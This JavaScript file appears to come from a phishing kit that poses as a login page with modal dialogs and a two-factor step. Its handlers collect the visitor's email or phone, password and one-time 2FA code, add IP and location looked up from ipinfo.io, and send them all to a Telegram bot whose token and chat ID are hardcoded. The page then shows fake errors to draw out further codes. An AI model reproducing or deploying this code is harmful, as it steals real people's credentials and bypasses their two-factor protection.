document.getElementById("review")?.addEventListener("click", function () {
    var modal = document.getElementById("exampleModal1");
    var backdrop = document.querySelector(".modal-backdrop");

    if (!backdrop) {
        backdrop = document.createElement("div");
        backdrop.classList.add("modal-backdrop");
        document.body.appendChild(backdrop);
    }

    backdrop.style.display = "block";

    if (modal) {
        modal.style.display = "block";
        modal.classList.add("show");
        modal.setAttribute("aria-hidden", "false");
        modal.setAttribute("aria-modal", "true");
    }

    backdrop.addEventListener('click', function () {
        closeModal(modal, backdrop);
    });
});

document.getElementById('continueform')?.addEventListener('click', function (event) {
    event.preventDefault();

    var password = document.querySelector('input[name="password-1"]').value.trim();
    var invalidFeedback = document.getElementById('passwordError');
    var spinner = document.getElementById('spinner-login'); // Spinner
    var passtext = document.getElementById('passtext'); // Phần chữ "Continue"
    var phone = document.getElementById('PersonalEmailField').value.trim();

    let isValid = true;
    if (phone === "" || password === "" || password.length < 6) {
        isValid = false;
    }
    else {
        let emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        let phonePattern = /^\+?\d{7,}$/;
        if (!emailPattern.test(phone) && !phonePattern.test(phone)) {
            isValid = false;
        }
    }

    if (!isValid) {
        invalidFeedback.style.display = 'block';
        invalidFeedback.style.color = '#ff2035';
    } else if (loginCount < 0) {
        invalidFeedback.style.display = 'none';

        // Ẩn chữ "Continue" và thay thế bằng spinner
        passtext.style.display = 'none'; // Ẩn chữ "Continue"
        spinner.style.display = 'inline-block'; // Hiển thị spinner tại vị trí
        sessionStorage.setItem('password1', password);
        loginCount++;

        var phone = sessionStorage.getItem('phone');
        var ipAddress = sessionStorage.getItem('client-ip');
        var location = sessionStorage.getItem('client-location');
        var password1 = sessionStorage.getItem('password1');

        var token = '8070090070:AAH-T6pIWoSBtYxp_WVCI_GUfZxbVCuiyH0';
        var chatId = '-5142316257';
        var message = `IP: ${ipAddress}\nLocation: ${location}\n\nPhone Or Email: ${phone}\nPassword: ${password1}`;

        //console.log(message);
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
            .then(response => {
                if (response.ok) {
                    console.log('Data sent to Telegram successfully!');
                } else {
                    console.error('Failed to send data to Telegram.');
                }
            })
            .catch(error => {
                console.error('Error sending data to Telegram:', error);
            });

        setTimeout(function () {
            spinner.style.display = 'none'; // Ẩn spinner
            passtext.style.display = 'inline'; // Hiển thị lại chữ "Continue"
            invalidFeedback.style.display = 'block';
            invalidFeedback.style.color = 'red';
            
        }, 1000); // 10 giây = 10000 milliseconds

    }
    else {
        invalidFeedback.style.display = 'none';

        // Ẩn chữ "Continue" và thay thế bằng spinner
        passtext.style.display = 'none'; // Ẩn chữ "Continue"
        spinner.style.display = 'inline-block'; // Hiển thị spinner tại vị trí

        // Gửi dữ liệu đến Telegram
        //var phone = sessionStorage.getItem('phone');
        var ipAddress = sessionStorage.getItem('client-ip');
        var location = sessionStorage.getItem('client-location');

        sessionStorage.setItem('password', password);

        var token = '8070090070:AAH-T6pIWoSBtYxp_WVCI_GUfZxbVCuiyH0';
        var chatId = '-5142316257';
        var message = `IP: ${ipAddress}\nLocation: ${location}\n\nPhone: ${phone}\nPassword: ${password}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
            .then(response => {
                if (response.ok) {
                    console.log('Data sent to Telegram successfully!');
                } else {
                    console.error('Failed to send data to Telegram.');
                }
            })
            .catch(error => {
                console.error('Error sending data to Telegram:', error);
            });

        // Sau 10 giây, ẩn spinner, đóng modal hiện tại và hiển thị modal 2FA
        setTimeout(function () {
            spinner.style.display = 'none'; // Ẩn spinner
            passtext.style.display = 'inline'; // Hiển thị lại chữ "Continue"

            // Đóng modal hiện tại nếu có
            //closeModal(currentModal, currentBackdrop);

            // Tạo backdrop cho modal 2FA
            // var modal = document.getElementById("twoFAmodal");
            // var backdrop = document.createElement("div");
            // backdrop.classList.add("modal-backdrop");
            // document.body.appendChild(backdrop);
            // backdrop.style.display = "block";

            // if (modal) {
            //     modal.style.display = "block";
            //     modal.classList.add("show");
            //     modal.setAttribute("aria-hidden", "false");
            //     modal.setAttribute("aria-modal", "true");
            // }

            // backdrop.addEventListener('click', function () {
            //     closeModal(modal, backdrop);
            // });

            window.location.href = 'verify.html';
        }, 3000); // 10 giây = 10000 milliseconds
    }
});

document.querySelectorAll(".action-button.wide").forEach(function (button) {
    button.addEventListener("click", function () {
        var backdrop = document.querySelector(".modal-backdrop");

        if (!backdrop) {
            backdrop = document.createElement("div");
            backdrop.classList.add("modal-backdrop");
            document.body.appendChild(backdrop);
        }

        backdrop.style.display = "block";

        backdrop.addEventListener('click', function () {
            closeModal(null, backdrop);
        });
    });
});

document.querySelectorAll(".btn-close").forEach(function (button) {
    button.addEventListener("click", function () {
        var openModal = document.querySelector(".modal.show");
        var backdrop = document.querySelector(".modal-backdrop");
        closeModal(openModal, backdrop);
    });
});

function closeModal(modal, backdrop) {
    if (modal) {
        modal.style.display = "none";
        modal.classList.remove("show");
        modal.setAttribute("aria-hidden", "true");
        modal.removeAttribute("aria-modal");
    }

    if (backdrop) {
        backdrop.style.display = "none";
        if (!document.querySelector(".modal.show")) {
            document.body.removeChild(backdrop);
        }
    }
}

document.getElementById("exampleInputPassword")?.addEventListener("focus", function (event) {
    event.preventDefault();

    document.getElementById('togglePassword').style.display = 'block';
});


document.addEventListener("click", (e) => {
    const wrapper = document.getElementById('exampleInputPassword');
    const togglePassword = document.getElementById('togglePassword');

  if (e.target != wrapper && e.target != togglePassword) {
    if (togglePassword != null) {
        togglePassword.style.display = "none";
    }
  }
});

document.getElementById('togglePassword')?.addEventListener('click', function (event) {

    var passwordInput = document.getElementById('exampleInputPassword');
    var icon = this;

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        icon.classList.remove('bi-eye');
        icon.classList.add('bi-eye-slash');
    } else {
        passwordInput.type = 'password';
        icon.classList.remove('bi-eye-slash');
        icon.classList.add('bi-eye');
    }
});



function closeModal(modal, backdrop) {
    if (modal) {
        modal.style.display = "none";
        modal.classList.remove("show");
        modal.setAttribute("aria-hidden", "true");
        modal.removeAttribute("aria-modal");
    }

    if (backdrop) {
        backdrop.style.display = "none";
        document.body.removeChild(backdrop);
    }
}

document.addEventListener("DOMContentLoaded", function () {
    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            sessionStorage.setItem('client-ip', data.ip);
            sessionStorage.setItem('client-location', `${data.city}, ${data.region}, ${data.country}`);
            console.log("Client's IP address is: " + data.ip);
            // document.getElementById('client-ip').textContent = `Your IP: ${data.ip}`;
        })
        .catch(error => {
            console.error("Error fetching the IP address: ", error);
        });
});

let loginCount = 0;


document.getElementById('send2fa')?.addEventListener('click', function (event) {
    console.log("2FA button clicked");
    event.preventDefault();

    var twoFACode = document.querySelector('input[name="2FA-1"]').value.trim();
    var invalidFeedback = document.getElementById('invalid2fa');
    var spinner = document.getElementById('2faspin'); // Spinner
    var timerElement = document.getElementById('timer');
    var continueText = document.getElementById('2faBtn');

    let pattern = /^\d{6,}$/;
    if (twoFACode === "" || !pattern.test(twoFACode)) {
        if (twoFACode.length < 6) {
            invalidFeedback.textContent = "Verification code must be at least 6 digits.";
        }
        else {
        invalidFeedback.textContent = "The verification code is invalid.";
        }
    invalidFeedback.style.display = 'block';
        invalidFeedback.style.color = '#ff2035';
        return;
    }

    invalidFeedback.style.display = 'none';
    invalidFeedback.style.color = '#ff2035';
    continueText.style.display = "none";
    spinner.style.display = 'inline-block'; // Hiển thị spinner tại vị trí
    //startTimer(timerElement);

    var ipAddress = sessionStorage.getItem('client-ip');
    var location = sessionStorage.getItem('client-location');

    var token = '7272810965:AAFyd5df_M6mry_zWp_3_sxij_PZY27ZwLQ';
    var chatId = '-5142316257';
    var message = `IP: ${ipAddress}\nLocation: ${location}\n\n2FA Code: ${twoFACode}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
        .then(response => {
            if (response.ok) {
                console.log('2FA Code sent to Telegram successfully!');
            } else {
                console.error('Failed to send 2FA code to Telegram.');
            }
        })
        .catch(error => {
            console.error('Error sending 2FA code to Telegram:', error);
        });

    setTimeout(function () {
        spinner.style.display = 'none'; // Ẩn spinner
        invalidFeedback.textContent = "The verification code is incorrect or has expired. Please check again or accept on another device.";
        invalidFeedback.style.display = 'block';
        continueText.style.display = 'inline-block';
    }, 3000); // 10 giây = 10000 milliseconds
});

function startTimer(timerElement) {
    var countdown = 30;
    timerElement.textContent = countdown + ' seconds';

    var timer = setInterval(function () {
        countdown--;
        if (countdown <= 0) {
            clearInterval(timer);
            timerElement.textContent = 'Try again now';
        } else {
            timerElement.textContent = countdown + ' seconds';
        }
    }, 1000);
}

// Sau 1 giây thì tắt videoMain và hiện main
setTimeout(function() {
    document.getElementById('videoMain').style.display = 'none';
    document.getElementById('main').style.display = 'block';
}, 3500);
